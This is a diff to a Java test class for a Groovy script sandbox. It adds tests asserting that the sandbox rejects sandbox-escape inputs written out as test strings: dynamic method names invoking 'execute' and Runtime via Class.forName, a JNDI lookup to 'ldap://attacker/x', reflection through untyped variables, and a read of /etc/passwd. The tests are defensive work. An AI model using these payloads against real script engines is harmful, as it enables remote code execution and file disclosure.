@@ -54,6 +54,30 @@ public class ScriptSandboxConfigurationTest {
     }
 
     @Test
+    public void sandboxBlocksDynamicMethodNames() {
+        // GString 动态方法名无法静态检查 —— fail-closed 拒绝，不允许绕过方法名黑名单
+        assertRejected("def n = 'execute'; 'ls'.\"$n\"()");
+        assertRejected("def n = 'forName'; Class.\"$n\"('java.lang.Runtime')");
+    }
+
+    @Test
+    public void sandboxBlocksJndiLookup() {
+        assertRejected("new javax.naming.InitialContext().lookup('ldap://attacker/x')");
+        assertRejected("import javax.naming.Context; Context c = null");
+        assertRejected("new javax.naming.directory.InitialDirContext()");
+    }
+
+    @Test
+    public void sandboxBlocksReflectionThroughUntypedReceiver() {
+        // def 变量编译期类型为 Object，绕过 receiversBlackList：方法名黑名单在编译期拦截
+        assertRejected("def c = 'x'.class; c.newInstance()");
+        assertRejected("def c = 'x'.class; c.getMethod('toString')");
+        // 名单外方法在运行期由 java.lang.Class 元类守卫拦截
+        assertRejected("def c = 'x'.class; c.getDeclaredMethods()");
+        assertRejected("def c = 'x'.class; c.getResource('/')");
+    }
+
+    @Test
     public void sandboxBlocksFileAccess() {
         assertRejected("new java.io.File('/etc/passwd').text");
         assertRejected("new java.nio.file.Files()");
